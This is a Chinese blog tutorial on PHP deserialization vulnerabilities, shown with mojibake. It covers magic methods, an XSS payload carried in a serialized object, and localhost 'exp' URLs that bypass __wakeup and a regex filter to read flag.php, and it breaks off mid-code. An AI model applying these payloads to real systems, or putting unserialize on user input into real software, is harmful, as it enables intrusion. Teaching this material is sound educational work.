        <content type="html"><![CDATA[<p>æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚</p><p><strong>åºåˆ—åŒ–</strong></p><ul><li><code>serialize()</code> å°†å¯¹è±¡è½¬å˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ä¾¿äºä¹‹åçš„ä¼ é€’ä¸ä½¿ç”¨ã€‚</li><li>åºåˆ—åŒ–ä¼šä¿å­˜å¯¹è±¡æ‰€æœ‰çš„å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚</li></ul><p><strong>ååºåˆ—åŒ–</strong></p><ul><li><code>unserialize()</code> å°†åºåˆ—åŒ–çš„ç»“æœæ¢å¤æˆå¯¹è±¡ã€‚</li><li>ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»åœ¨ååºåˆ—åŒ–ä¹‹å‰å®šä¹‰ï¼Œæˆ–è€…é€šè¿‡åŒ…å«è¯¥ç±»çš„å®šä¹‰æˆ–è€…ä½¿ç”¨ <code>spl_autoload_register()</code> (è‡ªåŠ¨åŒ…å«ç±»)å®ç°</li></ul><a id="more"></a><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</p><h3 id="phpé­”æœ¯æ–¹æ³•"><a href="#phpé­”æœ¯æ–¹æ³•" class="headerlink" title="phpé­”æœ¯æ–¹æ³•"></a>phpé­”æœ¯æ–¹æ³•</h3><blockquote><p>PHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚</p></blockquote><p>é€šå¸¸æ¥è¯´æœ‰ä¸€äº›PHPçš„é­”æ³•å‡½æ•°ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ï¼Œå¦‚ï¼š</p><p><code>__construct</code> å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨</p><p><code>__wakeup</code> ä½¿ç”¨unserialize()å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</p><p><code>__destruct</code> å½“å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ (phpç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡)</p><p><code>__toString</code> å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚</p><p><code>__sleep()</code> ä½¿ç”¨serialize()å‡½æ•°æ—¶è§¦å‘</p><p><code>__call()</code>  åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </p><p><code>__callStatic()</code> åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p><p><code>__get()</code> ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</p><p><code>__set()</code> ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p><p><code>__isset()</code> åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ </p><p><code>__unset()</code> åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</p><p><code>__toString()</code> æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²</p><p><code>__invoke()</code> å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $varr2 = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> test();<span class="comment">//åºåˆ—åŒ–å¯¹è±¡ï¼Œè°ƒç”¨__construct()æ–¹æ³•ï¼Œè¾“å‡º__construct</span></span><br><span class="line">$obj-&gt;echoP();    <span class="comment">//è°ƒç”¨echoP()æ–¹æ³•ï¼Œè¾“å‡º&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $obj;        <span class="comment">//objå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºï¼Œè°ƒç”¨__toString()æ–¹æ³•ï¼Œè¾“å‡º__toString</span></span><br><span class="line">$s = serialize($obj);   <span class="comment">//objå¯¹è±¡è¢«åºåˆ—åŒ–ï¼Œè°ƒç”¨__sleep()æ–¹æ³•ï¼Œè¾“å‡º__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize($s);  <span class="comment">//$sé¦–å…ˆä¼šè¢«ååºåˆ—åŒ–ï¼Œä¼šè°ƒç”¨__wakeup()æ–¹æ³•ï¼Œè¢«ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡åˆè¢«å½“åšå­—ç¬¦ä¸²ï¼Œå°±ä¼šè°ƒç”¨_toString()æ–¹æ³•ã€‚ </span></span><br><span class="line"><span class="comment">//è„šæœ¬ç»“æŸé”€æ¯å¯¹è±¡ï¼ˆ$objå’Œååºåˆ—åŒ–çš„$sï¼‰æ—¶ï¼Œåˆä¼šè°ƒç”¨__destruct()æ–¹æ³•ï¼ˆä¸¤æ¬¡ï¼‰ï¼Œè¾“å‡º__destructï¼ˆä¸¤æ¬¡ï¼‰</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æ¼æ´ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯•æ„é€ åºåˆ—åŒ–ä»£ç çš„æ—¶å€™æ’å…¥xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡º<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p><p><code>O</code>è¡¨ç¤ºç±»å‹æ˜¯object</p><p><code>1</code>è¡¨ç¤ºobjectå¯¹åº”çš„ç±»çš„åå­—çš„é•¿åº¦ä¸º1</p><p><code>â€œAâ€</code>è¡¨ç¤ºç±»å</p><p><code>1</code>è¡¨ç¤ºå¯¹åº”å˜é‡çš„ä¸ªæ•°</p><p><code>s</code>è¡¨ç¤ºåºåˆ—åŒ–åä¸ºå­—ç¬¦ä¸²</p><p><code>4</code>è¡¨ç¤ºå­—ç¬¦ä¸²çš„é•¿åº¦</p><p><code>â€œtest&quot;</code>è¡¨ç¤ºè¡¨ç¤ºå˜é‡å</p><p><code>s</code>è¡¨ç¤ºå˜é‡testçš„ç±»å‹</p><p><code>28</code>è¡¨ç¤ºå˜é‡testçš„é•¿åº¦</p><p><code>&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</code>è¡¨ç¤ºå˜é‡testçš„å€¼</p><p><img src="https://s1.ax1x.com/2020/07/30/anGITe.png" alt="anGITe.png"></p><p>å¦‚æœ<code>__wakeup</code>ä¸­ä¸æ˜¯<code>echo()</code>ï¼Œè€Œæ˜¯<code>eval()</code>ï¼Œé‚£ä¹ˆå°±æ˜¯ä»»æ„ä»£ç æ‰§è¡Œï¼Œå±å®³å°±æ›´å¤§äº†ã€‚</p><h3 id="wakeupç»•è¿‡"><a href="#wakeupç»•è¿‡" class="headerlink" title="wakeupç»•è¿‡"></a>wakeupç»•è¿‡</h3><p><strong>ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°</strong></p><p>ä¾‹ï¼šåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶flag.phpå’Œtest.php</p><p>test.phpæºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file !== <span class="keyword">__FILE__</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">@unserialize($_REQUEST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥è¿›è¡Œæ­£å¸¸çš„ååºåˆ—åŒ–çš„è¯ï¼Œå³</p><blockquote><p><a href="http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p></blockquote><p>é¡µé¢æ²¡æœ‰å…¶å®ƒå˜åŒ–ï¼Œå› ä¸ºåœ¨ä½¿ç”¨unserialize()çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨__wakeupï¼Œå°†fileæ›¿æ¢ä¸ºå½“å‰è·¯å¾„</p><p>phpåœ¨è§£æå±æ€§é•¿åº¦çš„æ—¶å€™ï¼Œè‹¥æ˜¯å‡ºé”™</p><blockquote><p>å°†<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>æ”¹ä¸º</p><p><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p></blockquote><p>å®ƒå¹¶ä¸ä¼šç»ˆæ­¢ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œï¼Œä½†ä¸ä¼šè°ƒç”¨__wakeup()</p><p>ç„¶ååœ¨é”€æ¯å¯¹è±¡çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨__destruct()å‡½æ•°ï¼Œé«˜äº®æ˜¾ç¤ºflag.php</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="OCç»•è¿‡"><a href="#OCç»•è¿‡" class="headerlink" title="OCç»•è¿‡"></a>OCç»•è¿‡</h3><p>å¯¹test.phpè¿›è¡Œä¿®æ”¹</p><p>å¯¹ä¼ è¿›æ¥çš„fileè¿›è¡Œè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file !== <span class="keyword">__FILE__</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[OC]:\d+:/i&#x27;</span>, $file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacking!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@unserialize($_REQUEST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯¹fileè¿›è¡Œäº†è¿‡æ»¤</p><p>å½“é‡åˆ° å­—æ¯<code>O</code>æˆ–<code>C</code> åŠ ä¸Š<code>:</code>ï¼Œå†åŠ ä¸Šä¸€æ®µæ•°å­—å’Œ<code>:</code>ï¼Œåé¢çš„ i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ æ—¶ï¼Œåˆ™dieæ‰ã€‚</p><p>è¯¥æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„éƒ¨åˆ†ä¸ºï¼š<code>O:1:</code></p><p>è‹¥åœ¨ä¸­é—´æ’å…¥ä¸€äº›å­—ç¬¦ï¼Œå°±å¯ä»¥è®©å®ƒåŒ¹é…ä¸å®Œå…¨ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…</p><p>å¯¹äºæ•°å­— 1 æ¥è¯´ï¼Œ+1 å’Œ 1 æ—¶ä¸€æ ·çš„ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡</p><p>ä½†åœ¨URLä¼ å‚ä¸­ï¼Œä¼šè¿›è¡Œè§£ç ï¼Œä¼šæŠŠåŠ å·ï¼ˆ+ï¼‰å˜æˆç©ºæ ¼ï¼Œæ‰€ä»¥åº”ç”¨<code>+</code>çš„URLç¼–ç ï¼š<code>%2b</code>ä»£æ›¿</p><p>å³ï¼š</p><blockquote><p>O:%2b1:</p></blockquote><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="ç§æœ‰å±æ€§ç»•è¿‡"><a href="#ç§æœ‰å±æ€§ç»•è¿‡" class="headerlink" title="ç§æœ‰å±æ€§ç»•è¿‡"></a>ç§æœ‰å±æ€§ç»•è¿‡</h3><p><a href="https://www.cnblogs.com/jsdd/p/11603919.html">phpä¸­çš„è®¿é—®ç±»å‹ï¼ˆpublicï¼Œprivateï¼Œprotectedï¼‰</a></p><p>public å…¬æœ‰ä¿®é¥°ç¬¦ï¼Œç±»ä¸­çš„æˆå‘˜æ²¡æœ‰è®¿é—®é™åˆ¶ï¼Œæ‰€æœ‰å¤–éƒ¨æˆå‘˜éƒ½å¯ä»¥è®¿é—®ï¼ˆè¯»å’Œå†™ï¼‰è¿™ä¸ªç±»æˆå‘˜ï¼ˆåŒ…æ‹¬æˆå‘˜å±æ€§å’Œæˆå‘˜æ–¹æ³•ï¼‰ã€‚</p><p>private ç§æœ‰ä¿®é¥°ç¬¦ï¼Œè¢«å®šä¹‰ä¸ºprivateçš„æˆå‘˜ï¼Œå¯¹äºåŒä¸€ä¸ªç±»é‡Œçš„æ‰€æœ‰æˆå‘˜æ˜¯å¯è§çš„ï¼Œå³æ²¡æœ‰è®¿é—®é™åˆ¶ï¼›ä½†å¯¹äºè¯¥ç±»çš„å¤–éƒ¨ä»£ç æ—¶ä¸å…è®¸æ”¹å˜ç”šè‡³è¯»æ“ä½œçš„ï¼Œå¯¹äºè¯¥ç±»çš„å­ç±»ï¼Œä¹Ÿä¸èƒ½è®¿é—®privateä¿®é¥°çš„æˆå‘˜ã€‚</p><p>protected ä¿æŠ¤æˆå‘˜ä¿®é¥°ç¬¦ï¼Œè¢«ä¿®é¥°ä¸ºprotectedçš„æˆå‘˜ä¸èƒ½è¢«è¯¥ç±»çš„å¤–éƒ¨ä»£ç è®¿é—®ã€‚ä½†æ˜¯å¯¹äºè¯¥ç±»çš„å­ç±»æœ‰è®¿é—®æƒé™ï¼Œå¯ä»¥è¿›è¡Œå±æ€§ã€æ–¹æ³•çš„è¯»åŠå†™æ“ä½œã€‚</p><blockquote><p>public è¡¨ç¤ºå…¨å±€ï¼Œç±»å†…éƒ¨å¤–éƒ¨å­ç±»éƒ½å¯ä»¥è®¿é—®ï¼›<br>private è¡¨ç¤ºç§æœ‰çš„ï¼Œåªæœ‰æœ¬ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨ï¼›<br>protected è¡¨ç¤ºå—ä¿æŠ¤çš„ï¼Œåªæœ‰æœ¬ç±»æˆ–å­ç±»æˆ–çˆ¶ç±»ä¸­å¯ä»¥è®¿é—®ï¼›</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test1 = <span class="string">&quot;hello&quot;</span></span><br><span class="line">    <span class="keyword">private</span> $test2 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/10/07/0ahFhQ.png" alt="0ahFhQ.png"></p><p>testç±»å®šä¹‰äº†ä¸‰ä¸ªä¸åŒç±»å‹(å…¬æœ‰ï¼Œç§æœ‰ï¼Œä¿æŠ¤)ï¼Œä½†æ˜¯å€¼ç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œåºåˆ—åŒ–è¾“å‡ºçš„å€¼ä¸ç›¸åŒ</p><p>privateå±æ€§åºåˆ—åŒ–ä¸ºï¼š%00ç±»å%00å˜é‡åï¼Œå¯¹äºtest2æ¥è¯´ï¼Œåºåˆ—åŒ–åçš„é•¿åº¦åˆ™å˜ä¸º11</p><p>protectedå±æ€§åºåˆ—åŒ–ä¸ºï¼š%00*%00å˜é‡åï¼Œå¯¹äºtest3æ¥è¯´ï¼Œåºåˆ—åŒ–åçš„é•¿åº¦åˆ™å˜ä¸º8</p><blockquote><p>%00æ˜¯ä¸å¯è§å­—ç¬¦</p></blockquote><p>å¯¹test.phpç»§ç»­è¿›è¡Œä¿®æ”¹</p><p>å°†publicæ”¹ä¸ºprivate</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 